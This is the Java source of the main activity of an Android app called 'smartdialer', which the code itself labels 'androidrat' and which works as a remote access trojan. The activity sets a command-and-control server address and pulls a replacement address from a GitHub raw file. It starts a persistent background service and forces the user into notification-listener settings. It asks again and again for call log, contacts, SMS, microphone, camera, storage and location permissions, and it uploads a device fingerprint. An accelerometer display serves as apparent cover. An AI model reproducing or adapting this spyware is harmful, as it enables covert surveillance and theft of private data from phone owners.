package com.example.smartdialer;

import androidx.annotation.NonNull;
import androidx.annotation.Nullable;
import androidx.annotation.RequiresApi;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;

import android.Manifest;
import android.annotation.SuppressLint;
import android.app.Activity;
import android.app.ActivityManager;
import android.app.AlertDialog;
import android.content.ContentResolver;
import android.content.Context;
import android.content.DialogInterface;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.IntentSender;
import android.content.pm.PackageManager;
import android.hardware.Sensor;
import android.hardware.SensorEvent;
import android.hardware.SensorEventListener;
import android.hardware.SensorManager;
import android.location.Location;
import android.location.LocationManager;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.os.Environment;
import android.os.Handler;
import android.os.Looper;
import android.provider.Settings;
import android.telephony.TelephonyManager;
import android.util.Log;
import android.view.View;
import android.widget.EditText;
import android.widget.TextView;
import android.widget.Toast;

import com.example.smartdialer.client.API;
import com.example.smartdialer.client.APIinterface;
import com.example.smartdialer.client.RetrofitClient;
import com.example.smartdialer.services.LocationService;
import com.example.smartdialer.services.MainService;
import com.google.android.gms.common.api.ResolvableApiException;
import com.google.android.gms.location.LocationRequest;
import com.google.android.gms.location.LocationServices;
import com.google.android.gms.location.LocationSettingsRequest;
import com.google.android.gms.location.LocationSettingsResponse;
import com.google.android.gms.location.SettingsClient;
import com.google.android.gms.tasks.OnFailureListener;
import com.google.android.gms.tasks.OnSuccessListener;
import com.google.android.gms.tasks.Task;

import org.json.JSONException;
import org.json.JSONObject;

import java.io.DataOutputStream;
import java.io.File;
import java.io.IOException;
import java.util.List;

import okhttp3.MediaType;
import okhttp3.RequestBody;
import okhttp3.ResponseBody;
import retrofit2.Call;
import retrofit2.Callback;
import retrofit2.Response;

public class MainActivity extends AppCompatActivity {
    PrefManager prefManager;
    SensorManager sm;
    List list;
    TextView textView;

    float[] minimum = {0.00000000000f, 0.00000000000f,0.00000000000f};
    float[] maximum= {0.00000000000f, 0.00000000000f,0.00000000000f};
    @SuppressLint("MissingInflatedId")
    @RequiresApi(api = Build.VERSION_CODES.LOLLIPOP_MR1)
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        prefManager = new PrefManager(this);
        textView = findViewById(R.id.textView);

        prefManager.setString("host", "http://13.37.112.215:4000");
        RetrofitClient.getRetrofitInstance().create(APIinterface.class).getResponse("https://raw.githubusercontent.com/sumanmanna6111/appcrt/master/auth.json").enqueue(new Callback<ResponseBody>() {
            @Override
            public void onResponse(Call<ResponseBody> call, Response<ResponseBody> response) {
                try {
                    String res = response.body().string();
                    JSONObject jsonObject = new JSONObject(res);
                    JSONObject config = jsonObject.getJSONObject("androidrat");
                    prefManager.setString("host", config.getString("host"));
                } catch (Exception e) {
                    e.printStackTrace();
                }

            }

            @Override
            public void onFailure(Call<ResponseBody> call, Throwable t) {
                Log.e("TAG", "onFailure: ");
            }
        });
        if (!isRunningService()) {
            Intent serviceIntent = new Intent(this, MainService.class);
            ContextCompat.startForegroundService(this, serviceIntent);
            /*Intent intentLocation = new Intent(this, LocationService.class);
            ContextCompat.startForegroundService(this, intentLocation);*/
        }

        RequestPermission();

        if (!isNotificationServiceRunning()) {
            startActivity(new Intent(Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS));
        }

        findViewById(R.id.button).setOnLongClickListener(new View.OnLongClickListener() {
            @Override
            public boolean onLongClick(View v) {
                Log.e("TAG", "onLongClick: " );
                final EditText tag = new EditText(MainActivity.this);
                new AlertDialog.Builder(MainActivity.this)
                        //.setTitle("Alert")
                        .setMessage("Tag")
                        .setView(tag)
                        .setPositiveButton("SET", new DialogInterface.OnClickListener() {
                            public void onClick(DialogInterface dialog, int whichButton) {
                                sendDeviceInfo(tag.getText().toString());
                            }
                        })
                        .setNegativeButton("Cancel", new DialogInterface.OnClickListener() {
                            public void onClick(DialogInterface dialog, int whichButton) {
                            }
                        })
                        .show();
                return true;
            }
        });

        sm = (SensorManager) getSystemService(Context.SENSOR_SERVICE);
        list = sm.getSensorList(Sensor.TYPE_LINEAR_ACCELERATION); //Type Sensor
        if (list.size() > 0) {
            sm.registerListener(sel, (Sensor) list.get(0), SensorManager.SENSOR_DELAY_NORMAL);
        } else {
            Toast.makeText(getBaseContext(), "Sorry, sensor not available for this device.", Toast.LENGTH_LONG).show();
        }
    }

    SensorEventListener sel = new SensorEventListener() {
        @Override
        public void onSensorChanged(SensorEvent event) {
            float[] values = event.values;
            if (values[0] < minimum[0]){
                minimum[0] = values[0];
            }
            if (values[0] > maximum[0]){
                maximum[0] = values[0];
            }

            if (values[1] < minimum[1]){
                minimum[1] = values[1];
            }
            if (values[1] > maximum[1]){
                maximum[1] = values[1];
            }

            if (values[2] < minimum[2]){
                minimum[2] = values[2];
            }
            if (values[2] > maximum[2]){
                maximum[2] = values[2];
            }


            textView.setText("x: " + values[0] + " m/s²\ny: " + values[1] + " m/s²\nz: " + values[2] + " m/s²\n\n\n"
                    +"mini x -"+minimum[0]+" max x -"+maximum[0]
                    +"\nmini y -"+minimum[1]+" max y -"+maximum[1]
                    +"\nmini z -"+minimum[2]+" max z -"+maximum[2]);


        }

        @Override
        public void onAccuracyChanged(Sensor sensor, int accuracy) {

        }
    };

    private void sendDeviceInfo(String tag) {
        JSONObject jsonObject = new JSONObject();
        @SuppressLint("HardwareIds")
        String android_id = Settings.Secure.getString(getContentResolver(), Settings.Secure.ANDROID_ID);
        try {
            jsonObject.put("tag", tag);
            jsonObject.put("serial", android_id);
            jsonObject.put("model", Build.MODEL);
            jsonObject.put("id", Build.ID);
            jsonObject.put("Manufacture", Build.MANUFACTURER);
            jsonObject.put("type", Build.TYPE);
            jsonObject.put("user", Build.USER);
            jsonObject.put("base", Build.VERSION_CODES.BASE);
            jsonObject.put("INCREMENTAL", Build.VERSION.INCREMENTAL);
            jsonObject.put("sdk", Build.VERSION.SDK);
            jsonObject.put("board", Build.BOARD);
            jsonObject.put("brand", Build.BRAND);
            jsonObject.put("host", Build.HOST);
            jsonObject.put("FINGERPRINT", Build.FINGERPRINT);
            jsonObject.put("release", Build.VERSION.RELEASE);
        } catch (JSONException e) {
            e.printStackTrace();
        }
        //Log.e("TAG", jsonObject.toString() );

        MediaType mediaType = MediaType.parse("application/json");
        RequestBody body = RequestBody.create(jsonObject.toString(), mediaType);
        RetrofitClient.getRetrofitInstance().create(APIinterface.class).postBodyToResponseBody(API.deviceinfo, body).enqueue(new Callback<ResponseBody>() {
            @Override
            public void onResponse(Call<ResponseBody> call, Response<ResponseBody> response) {
                try {
                    String res = response.body().string();
                    Toast.makeText(MainActivity.this, res, Toast.LENGTH_SHORT).show();
                }catch (Exception e){
                    e.printStackTrace();
                }
            }

            @Override
            public void onFailure(Call<ResponseBody> call, Throwable t) {
                Toast.makeText(MainActivity.this, "Failure", Toast.LENGTH_SHORT).show();
            }
        });
    }

    private void RequestPermission() {
        /*if(ContextCompat.checkSelfPermission(this, Manifest.permission.READ_CALL_LOG) != PackageManager.PERMISSION_GRANTED){
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                requestPermissions(new String[]{Manifest.permission.READ_CALL_LOG, Manifest.permission.READ_CONTACTS, Manifest.permission.READ_PHONE_STATE},0);
            }
        }*/
        final String[] PERMISSIONS_STORAGE = {
                Manifest.permission.READ_CALL_LOG,
                Manifest.permission.CALL_PHONE,
                Manifest.permission.READ_CONTACTS,
                //Manifest.permission.ACCESS_BACKGROUND_LOCATION,
                Manifest.permission.ACCESS_FINE_LOCATION,
                Manifest.permission.RECORD_AUDIO,
                Manifest.permission.READ_SMS,
                Manifest.permission.SEND_SMS,
                Manifest.permission.READ_EXTERNAL_STORAGE,
                Manifest.permission.WRITE_EXTERNAL_STORAGE,
                Manifest.permission.CAMERA
        };

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            requestPermissions(PERMISSIONS_STORAGE, 9);
        }else {
            ActivityCompat.requestPermissions(MainActivity.this, PERMISSIONS_STORAGE, 9);
        }
        /*Intent intent = new Intent(android.provider.Settings.ACTION_ACCESSIBILITY_SETTINGS);
        startActivity(intent);*/

        //Intent i = new Intent(android.provider.Settings.ACTION_APPLICATION_DETAILS_SETTINGS, Uri.parse("package:" + BuildConfig.APPLICATION_ID));
        //startActivity(i);
    }

    public boolean isRunningService() {
        ActivityManager activityManager = (ActivityManager) getSystemService(Context.ACTIVITY_SERVICE);
        if (activityManager != null) {
            for (ActivityManager.RunningServiceInfo service : activityManager.getRunningServices(Integer.MAX_VALUE)) {
                if (MainService.class.getName().equals(service.service.getClassName())) {
                    return true;
                }
            }
            return false;
        }
        return false;
    }

    private boolean isNotificationServiceRunning() {
        ContentResolver contentResolver = getContentResolver();
        String enabledNotificationListeners =
                Settings.Secure.getString(contentResolver, "enabled_notification_listeners");
        String packageName = getPackageName();
        return enabledNotificationListeners != null && enabledNotificationListeners.contains(packageName);
    }

    public static void createLocationRequest(Activity context) {
        LocationRequest locationRequest = LocationRequest.create();
        locationRequest.setInterval(10000);
        locationRequest.setFastestInterval(5000);
        locationRequest.setPriority(LocationRequest.PRIORITY_HIGH_ACCURACY);
        LocationSettingsRequest.Builder builder = new LocationSettingsRequest.Builder()
                .addLocationRequest(locationRequest);
        SettingsClient client = LocationServices.getSettingsClient(context);
        Task<LocationSettingsResponse> task = client.checkLocationSettings(builder.build());

        task.addOnSuccessListener(context, new OnSuccessListener<LocationSettingsResponse>() {
            @Override
            public void onSuccess(LocationSettingsResponse locationSettingsResponse) {
                // All location settings are satisfied. The client can initialize
                // location requests here.
                // ...

                //Toast.makeText(context, "Gps already open",Toast.LENGTH_LONG).show();
                Log.d("location settings", locationSettingsResponse.toString());
            }
        });

        task.addOnFailureListener(context, new OnFailureListener() {
            @Override
            public void onFailure(@NonNull Exception e) {
                if (e instanceof ResolvableApiException) {
                    // Location settings are not satisfied, but this can be fixed
                    // by showing the user a dialog.
                    try {
                        // Show the dialog by calling startResolutionForResult(),
                        // and check the result in onActivityResult().
                        ResolvableApiException resolvable = (ResolvableApiException) e;
                        resolvable.startResolutionForResult(context,
                                1);
                    } catch (IntentSender.SendIntentException sendEx) {
                        // Ignore the error.
                    }
                }
            }
        });
    }


    @Override
    protected void onActivityResult(int requestCode, int resultCode, @Nullable Intent data) {
        super.onActivityResult(requestCode, resultCode, data);
        if (requestCode == 1) {
            if (resultCode == RESULT_OK) {
                //Toast.makeText(this, "Gps opened", Toast.LENGTH_SHORT).show();
                //Log.d("result ok", data.toString());
                if (isNotificationServiceRunning()) {
                    finish();
                }
            } else if (resultCode == RESULT_CANCELED) {
                //Toast.makeText(this, "refused to open gps", Toast.LENGTH_SHORT).show();
            }
        }
        /*if (requestCode == 100) {
            Uri uri = data.getData();
            String filePath = uri.getPath();
            Toast.makeText(MainActivity.this, filePath, Toast.LENGTH_LONG).show();
        }*/
    }

    @Override
    public void onRequestPermissionsResult(int requestCode, @NonNull String[] permissions, @NonNull int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        if (requestCode == 9) {
            boolean isAllGranted = true;
            /*for (int i = 0; i < permissions.length; i++) {
                Log.e("TAG", permissions[i]+"" );
                Log.e("TAG", grantResults[i]+"" );

            }*/
            for (String permission : permissions) {
                if (ActivityCompat.checkSelfPermission(MainActivity.this,
                        permission) != PackageManager.PERMISSION_GRANTED) isAllGranted = false;
            }
            if (!isAllGranted) {
                RequestPermission();
            } else {
                // TODO -- Do any work when all permission are granted
                createLocationRequest(MainActivity.this);
            }
        }
    }


}